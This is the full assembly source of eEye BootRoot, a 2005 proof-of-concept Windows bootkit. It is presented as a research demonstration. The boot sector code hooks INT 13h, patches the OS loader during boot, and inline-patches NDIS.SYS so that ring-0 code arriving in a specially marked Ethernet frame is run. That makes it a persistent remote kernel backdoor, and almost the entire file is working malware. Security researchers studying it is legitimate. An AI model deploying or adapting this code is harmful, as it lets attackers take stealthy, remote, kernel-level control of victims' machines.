;===============================================================
; eEye BootRoot v0.90                  Last updated: 08/08/2005
;---------------------------------------------------------------
; Demonstration of the capabilities of custom boot sector code
; on a Windows NT-family system.
;
; Derek Soeder - eEye Digital Security - 04/02/2005
;===============================================================


.486p
.model tiny


BOOTORG EQU 7C00h						; our code is executed by the BIOS at 0000h:7C00h

BOOTROOT_SIZE EQU 200h


;----------------
BOOTROOT GROUP BRCODE16, BRDATA

ASSUME CS:BOOTROOT, DS:BOOTROOT, ES:BOOTROOT, SS:BOOTROOT


;----------------
BRCODE16 SEGMENT byte use16

@BRCODE16_START EQU $


;###################################
;##  Boot-Time Installation Code  ##
;###################################

	;
	; Initialization
	;

	cli

	xor		bx, bx
	mov		ss, bx

	mov		ss:[BOOTORG - 2], sp
	mov		sp, (BOOTORG - 2)

	push		ds
	pushad

	mov		ds, bx

	;
	; Reserve 1KB conventional memory for our memory-resident code
	;

	dec		word ptr ds:[0413h]			; 0040h:0013h - base memory size in KBs

	mov		ax, ds:[0413h]
	shl		ax, (10-4)				; AX *= 1024 / 16 (convert linear address in KBs to a segment)
	mov		es, ax

	;
	; Copy ourselves to reserved memory and initialize the rest to zeroes
	;

	cld

	mov		si, BOOTORG
	xor		di, di
	mov		cx, BOOTROOT_SIZE / 2
	rep movsw

	xor		ax, ax
	mov		ch, (1024 - BOOTROOT_SIZE) / 2 / 100h
	rep stosw

	;
	; Install our INT 13h hook
	;

	mov		eax, ds:[bx + (13h*4)]
	mov		es:[INT13HANDLER - @BRCODE16_START], eax	; store previous handler

	mov		word ptr [bx + (13h*4)], @Int13Hook	; point INT 13h vector to our hook handler
	mov		[bx + (13h*4) + 2], es			; (BX = 0 from earlier)

	;
	; Load and execute MBR from first hard drive (do this from resident code)
	;

	push		es
	push		@BootFromHDD
	retf

@BootFromHDD:

	sti

	mov		es, cx					; CX = 0 from above REP STOSW

	mov		ax, 0201h				; AL = number of sectors
	inc		cx					; CH = cylinder; CL = sector and high bits of cylinder
	mov		dx, 0080h				; DH = head; DL = drive number
	mov		bh, (BOOTORG / 100h)			; ES:BX -> destination buffer
	int		13h					; INT 13h/AH=02h: Read sector(s) into memory

	popad
	pop		ds
	pop		sp

	db		0EAh					; JMP FAR 0000h:7C00h
	dw		BOOTORG, 0000h


;##################################
;##  INT 13h Hook Real-Mode ISR  ##
;##################################

@Int13Hook:

	pushf
	cmp		ah, 42h					; IBM/MS INT 13 Extensions - EXTENDED READ
	je		short @Int13Hook_ReadRequest

	cmp		ah, 02h					; DISK - READ SECTOR(S) INTO MEMORY
	je		short @Int13Hook_ReadRequest
	popf

	db		0EAh					; JMP FAR INT13HANDLER
INT13HANDLER EQU $
	dd		?

@Int13Hook_ReadRequest:

	mov		byte ptr cs:[INT13LASTFUNCTION], ah

	;
	; Invoke original handler to perform read operation
	;

	popf
	pushf							; push Flags because we're simulating an INT
	call		dword ptr cs:[INT13HANDLER]		; call original handler
	jc		short @Int13Hook_ret			; abort immediately if read failed

	pushf
	cli
	push		es
	pusha

	;
	; Adjust registers to internally emulate an AH=02h read if AH=42h was used
	;

	mov		ah, 00h
INT13LASTFUNCTION EQU $-1
	cmp		ah, 42h
	jne		short @Int13Hook_notextread

	lodsw
	lodsw							; +02h  WORD    number of blocks to transfer
	les		bx, [si]				; +04h  DWORD   transfer buffer

@Int13Hook_notextread:

	;
	; Scan sector for a signature of the code we want to modify
	;

	test		al, al
	jle		short @Int13Hook_scan_done

	cld

	mov		cl, al
	mov		al, 8Bh
	shl		cx, 9					; (AL * 200h)
	mov		di, bx

  @Int13Hook_scan_loop:
								; 8B F0       MOV ESI, EAX
								; 85 F6       TEST ESI, ESI
								; 74 21       JZ $+23h
								; 80 3D ...   CMP BYTE PTR [ofs32], imm8
								; (the first 6 bytes of this signature exist in other modules!)
	repne scasb
	jne		short @Int13Hook_scan_done

	cmp		dword ptr es:[di], 74F685F0h
	jne		short @Int13Hook_scan_loop

	cmp		word ptr es:[di+4], 8021h
	jne		short @Int13Hook_scan_loop

	mov		word ptr es:[di-1], 15FFh		; FFh/15h/xx/xx/xx/xx: CALL NEAR [ofs32]

	mov		eax, cs
	shl		eax, 4

	add		cs:[(NDISBACKDOOR_LINEAR - @BRPATCHFUNC32_START) + BRCODE16_SIZE], eax

	add		ax, (@PatchFunction - @BRPATCHFUNC32_START) + BRCODE16_SIZE
	mov		cs:[PATCHFUNC32_LINEAR], eax		; should be okay to add to AX, since we can't cross 1KB boundary

	add		ax, PATCHFUNC32_LINEAR - ((@PatchFunction - @BRPATCHFUNC32_START) + BRCODE16_SIZE)
	mov		es:[di+1], eax

@Int13Hook_scan_done:

	popa
	pop		es
	popf

@Int13Hook_ret:

	retf 2							; discard saved Flags from original INT (pass back CF, etc.)

@BRCODE16_END EQU $

BRCODE16_SIZE EQU (@BRCODE16_END - @BRCODE16_START)

BRCODE16 ENDS


;----------------
BRPATCHFUNC32 SEGMENT byte use32

ASSUME CS:BRPATCHFUNC32, DS:nothing, ES:nothing, SS:nothing

@BRPATCHFUNC32_START EQU $


;################################################################
;##  NDIS.SYS!ethFilterDprIndicateReceivePacket Backdoor Code  ##
;################################################################

@NDISBackdoor:							; +00h  DWORD   'eBR\xEE' signature
								; +04h  [...]   code to execute (ESI points here on entry)
	pushfd
	pushad

	push		59h
	pop		ecx

	mov		esi, [esp+2Ch]				; ptr to some array of ptrs
	lodsd							; ptr to some structure
	mov		eax, [eax+8]				; ptr to an MDL for the packet
	cmp		dword ptr [eax+14h], ecx		; check size of packet
	jbe		@NDISBackdoor_ret

	add		ecx, [eax+0Ch]				; ptr to Ethernet frame
	cmp		dword ptr [ecx-4], 0EE524265h		; look for "eBR\xEE" signature at offset 55h in the frame
	jne		@NDISBackdoor_ret

	call		ecx

  @NDISBackdoor_ret:

	popad
	popfd

	push		ebp
	mov		ebp, esp
	sub		esp, 60h				; it doesn't matter if we allocate a little extra stack space

	db 0E9h							; E9h/xx/xx/xx/xx: JMP NEAR rel32
	; "JMP NEAR (ethFilterDprIndicateReceivePacket + 6)" 'rel32' will be manually appended here

@NDISBACKDOOR_END EQU $


;#####################################################
;##  Auxiliary RVA-to-Pointer Conversion Functions  ##
;#####################################################

@TranslateVirtualToRaw:

	pushad
	push		08h					; FIELD_OFFSET(IMAGE_SECTION_HEADER, VirtualSize)
	jmp		short @Translate

@TranslateRawToVirtual:

	pushad
	push		10h					; FIELD_OFFSET(IMAGE_SECTION_HEADER, SizeOfRawData)

@Translate:

	pop		eax

	test		word ptr [esi+20h], 0FFFh		; size of image (should be 4KB multiple if sections are aligned)
	jz		@Translate_ret

	mov		esi, [ebx+3Ch]				; IMAGE_DOS_HEADER.e_lfanew
	add		esi, ebx				; ptr to PE header

	movzx		ecx, word ptr [esi+06h]			; IMAGE_NT_HEADERS.FileHeader.NumberOfSections
	movzx		edi, word ptr [esi+14h]			; IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
	lea		edi, [esi+edi+18h]			; IMAGE_FIRST_SECTION(ESI)

@Translate_sectionloop:

	mov		edx, [esp+24h]				; function's stack "argument"

	sub		edx, [edi+eax+4]			; PIMAGE_SECTION_HEADER->{VirtualAddress,PointerToRawData}
	jb		short @Translate_sectionloop_next

	cmp		edx, [edi+eax]				; PIMAGE_SECTION_HEADER->{VirtualSize,SizeOfRawData}
	jbe		short @Translate_sectionloop_done

  @Translate_sectionloop_next:

	add		edi, 28h
	loop		@Translate_sectionloop

  @Translate_sectionloop_done:

	xor		al, 1Ch					; 08h --> 14h, 10h --> 0Ch
	add		edx, [edi+eax]				; PIMAGE_SECTION_HEADER->{PointerToRawData,VirtualAddress}

	mov		[esp+24h], edx				; update stack "argument" to contain translated value

@Translate_ret:

	popad
	ret


;#######################################
;##  Inline Code Patch Hook Function  ##
;#######################################

@PatchFunction:

	;
	; Initialization
	;

	pushfd
	pushad							; assume DS = ES = 10h (KGDT_R0_DATA: flat ring-0 data segment)

	cld

	;
	; Scan for address of module list base (_BlLoaderData)
	;

	mov		edi, [esp+24h]				; use EIP as a ptr into OSLOADER
	and		edi, NOT 000FFFFFh			; convert to image base ptr

	mov		al, 0C7h				; C7 46 34 00 40 00 00    MOV DWORD PTR [ESI+34h], 4000h

@PatchFunction_mlsigloop:					; assume that we will find it

	scasb
	jne		@PatchFunction_mlsigloop

	cmp		dword ptr [edi], 40003446h
	jne		@PatchFunction_mlsigloop

	mov		al, 0A1h				; A1 xx xx xx xx          MOV EAX, [xxxxxxxx]

@PatchFunction_mlbaseloop:

	scasb
	jne		@PatchFunction_mlbaseloop

	mov		esi, [edi]				; ptr to base of module list
	mov		esi, [esi]				; ptr to first node of module list
	mov		ebx, esi

	;
	; Search module list for NDIS.SYS
	;

@PatchFunction_modloop:

	mov		esi, [esi]
	cmp		esi, ebx
	jne		short @PatchFunction_modloop_nextnode	; break out if we've traversed the entire (circular) list

;----
@PatchFunction_done:

		;
		; Restore registers, perform displaced instructions, and return into patched code
		;

	popad
	popfd

	mov		esi, eax
	test		eax, eax
	jnz		short @PatchFunction_done_nojz

	pushfd
	add		dword ptr [esp+4], 21h
	popfd
@PatchFunction_done_nojz:

	ret
;----

@PatchFunction_modloop_nextnode:

	cmp		byte ptr [esi+2Ch], 8*2			; module file name 'UNICODE_STRING.Length' for L"NDIS.SYS"
	jne		short @PatchFunction_modloop

	mov		ecx, [esi+30h]
	mov		eax, [ecx]
	shl		eax, 8
	xor		eax, [ecx+4]
	and		eax, NOT 20202020h
	cmp		eax, 44534E49h				; "NDIS" mangled: 44004E00h ("N\0D\0" << 8) ^ 00530049h ("I\0S\0")
	jne		short @PatchFunction_modloop

	;
	; Search NDIS.SYS for ndisMLoopbackPacketX call to ethFilterDprIndicateReceivePacket
	;

 	mov		ebx, [esi+18h]				; EBX = image base address

	mov		edi, ebx
	mov		al, 50h					; 50                      PUSH EAX
								; 53                      PUSH EBX
								; C7 46 10 0E 00 00 00    MOV DWORD PTR [ESI+10h], 0Eh
@PatchFunction_nmlpxloop:

	scasb
	jne		@PatchFunction_nmlpxloop

	cmp		dword ptr [edi], 1046C753h
	jne		@PatchFunction_nmlpxloop

	cmp		dword ptr [edi+4], 0Eh
	jne		@PatchFunction_nmlpxloop

	lea		edx, [edi+0Dh]
	sub		edx, ebx

	push		edx
	call		@TranslateRawToVirtual
	pop		edx					; EDX = RVA of offset following CALL instruction
	
	add		edx, [edi+9]				; EDX += rel32

	push		edx
	call		@TranslateVirtualToRaw
	pop		edi					; EDI = ptr to start of eFDIRP in potentially raw image
	add		edi, ebx

	cmp		word ptr [edi], 0FF8Bh
	jne		@PatchFunction_no8BFF

	inc		edi
	inc		edx
	inc		edi
	inc		edx					; skip over "MOV EDI, EDI" at function start (XP SP2 and later)

@PatchFunction_no8BFF:

	mov		al, 0E9h				; E9h/xx/xx/xx/xx: JMP NEAR rel32
	stosb

	push		40h - 5					; RVA of destination (at 40h, inside DOS EXE code) - size of JMP
	pop		eax
	sub		eax, edx				; EAX (rel32) = destination RVA - source RVA
	stosd

	db		6Ah, (@NDISBACKDOOR_END - @NDISBackdoor)	; 6Ah/xx: PUSH simm8 (to keep MASM from being stupid)
	pop		ecx

	mov		esi, (@NDISBackdoor - @BRPATCHFUNC32_START) + BRCODE16_SIZE
NDISBACKDOOR_LINEAR EQU $-4

	lea		edi, [ebx+40h]
	rep movsb

	lea		eax, [edx+6 - (40h + (@NDISBACKDOOR_END - @NDISBackdoor) + 4)]
	stosd

	mov		word ptr ds:[000B8000h], 0901h		; blue smiley

	jmp		@PatchFunction_done

@BRPATCHFUNC32_END EQU $

BRPATCHFUNC32 ENDS


;----------------
BRDATA SEGMENT DWORD


;#############################
;##  Boot Sector Signature  ##
;#############################

	db 2 dup (?)						; this signature must be last two bytes in boot sector
	dw		0AA55h


;###############################
;##  Post-Resident Data Area  ##
;###############################

PATCHFUNC32_LINEAR EQU BOOTROOT_SIZE

BRDATA ENDS


END
